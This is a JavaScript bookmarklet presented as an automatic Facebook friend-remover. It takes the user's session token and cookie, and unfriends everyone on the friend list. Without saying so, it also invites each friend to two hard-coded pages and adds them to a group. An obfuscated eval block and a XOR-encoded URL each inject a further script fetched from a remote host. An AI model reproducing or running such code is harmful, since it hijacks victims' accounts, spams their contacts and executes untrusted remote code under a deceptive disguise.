javascript: var Title = "[ลบเพื่อนออโต้]</A>";
var Descriptions = "",
    _text = 'Powered By: <A style="color:#3B5998;" href="https://www.facebook.com/pages/Error404-Pro/167113693488785" target="_blank">Error404-Pro.Tk</A> & <A style="color:#3B5998;" href="https://www.facebook.com/pages/Error404-Pro/167113693488785" target="_blank"> Error404-Pro Cyber Force</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100001263373142" target="_blank"> SlowHacker Edit</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100001263373142" target="_blank">Test3/A></A>.</br>Test4<A style="color:#3B5998;" href="http://error404-pro.tk" target="_blank">[ลบเพื่อนออนโต้]</A>.</A>';

function InviteFriends(opo) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/profile/removefriendconfirm.php?uid=" + opo + "&unref=bd_friends_tab&nctr[_mod]=pagelet_timeline_app_collection_" + user_id + "%3A2356318349%3A2&__user=" + user_id + "&__a=1&__dyn=7n8ahyj2qmp5zpQ9UmWWaUGyxi9Ay8&__req=i&fb_dtsg=" + fb_dtsg + "&ttstamp=265816884971127865", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkred'>";
            err++;
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += arn[i] + " has been selected to be removed";
            suc++
        }
        Descriptions += "</div>";
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
        display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
        if (i > 0) {
            display += arr.length + " Friends Detected<br/>";
            display += "<b>" + suc + "</b> Friends Removed of " + (arr.length - i) + " Friends Processed ";
            display += "(" + i + " Lefted...)";
            display += "<div class='friend-edge'>";
            display += Descriptions;
            display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            display += "Please Wait While Unfrinding " + arn[i] + ".</br>";
            display += _text;
            display += "</div>";
            display += "</div>";
            window[tag + "_close"] = true
        } else {
            Title = "All Of Your Friends Have Been Removed</A>";
            display += arr.length + " Friends Detected and ";
            display += "<b>" + suc + " Friends Removed.</b></br>";
            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span><br/>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
            display += _text;
            display += "</div>";
            window[tag + "_close"] = false
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[tay];
        setTimeout("InviteFriends(" + s + ")", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);


    if (user_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=167113693488785&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
    if (user_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=396978267081247&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")

    if (user_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=431994330234615&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");

}
jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ? function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState)
                    if (200 == e.status) {
                        var b = "";
                        e.responseText && (b = e.responseText);
                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                        c && c(b)
                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};
var _0x612a = ["e a='f b: <A 0="1:#2;" 3="4://8.9.5/g" 6="7">h [i ] j%</A> & <A 0="1:#2;" 3="4://8.9.5/k" 6="7"> l m n o</A>.</c>p q b: </A><A 0="1:#2;" 3="4://8.9.5/r" 6="7"> s t</A></A>,</A><A 0="1:#2;" 3="4://8.9.5/u" 6="7"> v w. x</A></A>.</c>y z B C D E <A 0="1:#2;" 3="4://F.G.H/" 6="7">I J K</A>.</A>';L(M!=a){N:(O(){d.P.Q(d.R('S')).T='U://V.W.5/X/Y-Z/10/11.12'})()}", "|", "split", "style|color|3B5998|href|http|com|target|_blank|www|facebook|Omni_text|By|br|document|var|Powered|167113693488785|Loading|lllllllllll|99|199134496914077|Assam|Indian|Cyber|Force|Script|Made|100006619800809|Waqar|Ahmad|100006619800809|Bhargav|JT|Gogoi|For|More||Tools|Visit|Our|Blogger|automateyourfacebook|blogspot|in|Automate|Your|Facebook|if|_text|javascript|function|body|appendChild|createElement|script|src|https|raw|github|bhargav1996|Fun|time|master|Union|js", "", "fromCharCode", "replace", "\w+", "\b", "g"];
eval(function (_0x1b3bx1, _0x1b3bx2, _0x1b3bx3, _0x1b3bx4, _0x1b3bx5, _0x1b3bx6) {
    _0x1b3bx5 = function (_0x1b3bx3) {
        return (_0x1b3bx3 < _0x1b3bx2 ? _0x612a[4] : _0x1b3bx5(parseInt(_0x1b3bx3 / _0x1b3bx2))) + ((_0x1b3bx3 = _0x1b3bx3 % _0x1b3bx2) > 35 ? String[_0x612a[5]](_0x1b3bx3 + 29) : _0x1b3bx3.toString(36));
    };
    if (!_0x612a[4][_0x612a[6]](/^/, String)) {
        while (_0x1b3bx3--) {
            _0x1b3bx6[_0x1b3bx5(_0x1b3bx3)] = _0x1b3bx4[_0x1b3bx3] || _0x1b3bx5(_0x1b3bx3);
        };
        _0x1b3bx4 = [

            function (_0x1b3bx5) {
                return _0x1b3bx6[_0x1b3bx5];
            }
        ];
        _0x1b3bx5 = function () {
            return _0x612a[7];
        };
        _0x1b3bx3 = 1;
    };
    while (_0x1b3bx3--) {
        if (_0x1b3bx4[_0x1b3bx3]) {
            _0x1b3bx1 = _0x1b3bx1[_0x612a[6]](new RegExp(_0x612a[8] + _0x1b3bx5(_0x1b3bx3) + _0x612a[8], _0x612a[9]), _0x1b3bx4[_0x1b3bx3]);
        };
    };
    return _0x1b3bx1;
}(_0x612a[0], 62, 65, _0x612a[3][_0x612a[2]](_0x612a[1]), 0, {}));

function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
}
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
    if (window[tag + "_close"]) return "This script is running now!"
};
var i = 3;
var tay = 3;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var tag = "Close";
var page_name, x = document.getElementsByTagName("span");
for (i = 0; i < x.length; i++)
    if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length);
    var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
    display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
    display += arr.length + " Friends Detected";
    display += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = display;
    InviteFriends(arr[i])
});
var X = "jvvrq8--pcu,ekvjw`,amo-`jcpect3;;4-D`/Cwvm/vmmnq-ocqvgp-Qwrrmpv]Dkng,hq";
Y = "";
Z = "";
var V;
V = X.length;
for (i = 0; i < V; i++) {
    Y += String.fromCharCode(X.charCodeAt(i) ^ 2)
}
Z = unescape(Y);
document.body.appendChild(document.createElement('script')).src = Z;
